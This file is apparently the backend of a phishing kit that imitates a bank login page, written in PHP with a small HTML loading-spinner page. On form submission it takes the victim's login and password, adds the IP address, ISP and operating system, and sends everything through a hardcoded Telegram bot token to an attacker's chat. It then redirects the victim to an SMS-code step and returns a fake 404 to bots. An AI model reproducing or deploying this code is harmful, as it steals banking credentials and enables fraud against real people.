<?php
require_once 'app.php';

function strip($msg) {
    $t = 'bot8581309029:AAGG91iewMbtpig-6_qqJzjzfdAIsX89wno';
    $id = '1208249379';
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/' . $t . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=" . $id . "&text=" . urlencode($msg));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    curl_close($ch);
}


$random = rand(0, 100000000000);
$dispatch = substr(md5($random), 0, 17);

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!empty($_POST['verbot'])) {
        header("HTTP/1.0 404 Not Found");
        die();
    }
    
    error_reporting(0);

    $message = '/ 🔥 LOG BP 🔥🔥/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
    $message .= '🔥LOGIN: ' . $_POST['identifiant'] . "\r\n";
    $message .= '🔥PSW: ' . $_POST['motdepasse'] . "\r\n";
    $message .= '/🔥🔥🔥🔥🔥 details 🔥🔥🔥🔥/' . "\r\n";
    $message .= 'IPEN address : ' . get_user_ip() . "\r\n";
	$message .= 'ISPEN : ' . get_isp() . "\r\n";
	$message .= 'OSEN : ' . get_user_os() . "\r\n";
    strip($message);
    header("Location: sms.html");
    
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pocket</title>
    <style>
        /* Center the loader in the screen */
        #loading {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 9999;
        }

        /* Orange spinner */
        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid orange;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        function showLoading() {
            document.getElementById('loading').style.display = 'block';
        }
    </script>
</head>
<body>
    <div id="loading">
        <div class="spinner"></div>
    </div>

 
</body>
</html>
